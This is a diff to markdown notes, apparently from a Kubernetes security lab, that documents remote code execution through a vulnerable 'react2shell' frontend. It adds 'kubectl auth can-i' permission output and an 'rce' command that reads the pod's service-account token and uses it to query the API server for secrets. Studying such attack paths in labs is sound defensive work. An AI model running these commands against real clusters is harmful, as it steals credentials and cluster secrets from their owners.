@@ -73,8 +73,39 @@ python scripts/rce.py http://localhost:8080 "curl -S -m 5 http://nginx-api.prod/
 # confirm
 # list
 kubectl auth can-i --list --as=system:serviceaccount:secure-frontend:react2shell -n secure-frontend
+# Resources                                       Non-Resource URLs                      Resource Names   Verbs
+# selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+# selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+# selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+#                                                 [/.well-known/openid-configuration/]   []               [get]
+#                                                 [/.well-known/openid-configuration]    []               [get]
+#                                                 [/api/*]                               []               [get]
+#                                                 [/api]                                 []               [get]
+#                                                 [/apis/*]                              []               [get]
+#                                                 [/apis]                                []               [get]
+#                                                 [/healthz]                             []               [get]
+#                                                 [/healthz]                             []               [get]
+#                                                 [/livez]                               []               [get]
+#                                                 [/livez]                               []               [get]
+#                                                 [/openapi/*]                           []               [get]
+#                                                 [/openapi]                             []               [get]
+#                                                 [/openid/v1/jwks/]                     []               [get]
+#                                                 [/openid/v1/jwks]                      []               [get]
+#                                                 [/readyz]                              []               [get]
+#                                                 [/readyz]                              []               [get]
+#                                                 [/version/]                            []               [get]
+#                                                 [/version/]                            []               [get]
+#                                                 [/version]                             []               [get]
+#                                                 [/version]                             []               [get]
 
 # list secrets
-kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:secure-frontend:react2shell   # no
+kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:secure-frontend:react2shell
+# no
 
+```
+
+- rce
+
+```sh
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
 ```
